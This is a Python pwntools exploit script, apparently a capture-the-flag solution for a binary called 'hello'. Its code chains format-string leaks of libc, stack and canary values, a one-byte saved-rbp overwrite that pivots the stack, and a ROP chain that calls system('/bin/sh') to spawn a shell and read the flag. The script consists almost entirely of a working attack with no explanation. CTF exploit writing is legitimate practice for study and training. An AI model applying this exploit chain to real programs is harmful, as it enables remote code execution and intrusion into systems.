#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'hello'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1954
brva 0x1a03
brva 0x17bf
brva 0x17bf
brva 0x184b
brva 0x1675
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
# leak libc and stack
sla(b'name: ', b'%3$p') # libc
rcu(b"Hello, 0x")
libc.address = int(rl(), 16) - 0x114907
sla(b'friend? (y/n): ', b'y')
sa(b'name? ', b'%1$p')
rcu(b"Hello, 0x")
stack = int(rl(), 16)
main_rbp = stack + 0x2150
saved_rbp = main_rbp - 0x40
suggest_buf = saved_rbp - 0x10010
pivot = main_rbp & ~0xff00 # since can only modify 1 byte of saved rbp, we can only pivot to addr beyond 0x10000
log.success(f'libc: {hex(libc.address)}')
log.success(f'stack: {hex(stack)}')
log.success(f'saved_rbp: {hex(saved_rbp)}')
log.success(f'suggest_buf: {hex(suggest_buf)}')
log.success(f'pivot: {hex(pivot)}')

# modify saved rbp to pivot stack
sa(b'Say something to us: ', p64(saved_rbp + 1) + b'A' * 0x17) # use 0x1f when use fgets
sla(b'input: ', b'%8$hhn%13$p')
rcu(b'0x')
canary = int(p.recvuntil(b'Do you', drop=True), 16)
log.success(f'canary: {hex(canary)}')
sla(b'us? (y/n): ', b'y')

# now we pivoted stack to suggest_buf, and can overflow as rsp-rbp < 0x10000
payload = flat(
    b'A' * (pivot - 8 - suggest_buf),
    canary,
    0,
    libc.address + 0x29139, # ret
    libc.address + 0x2a3e5, # pop rdi ; ret
    next(libc.search(b'/bin/sh\x00')),
    libc.sym.system
)
sla(b'your suggestion: ', payload)
sla(b'(y/n): ', b'n')

sl(b'cat flag*')
p.interactive()
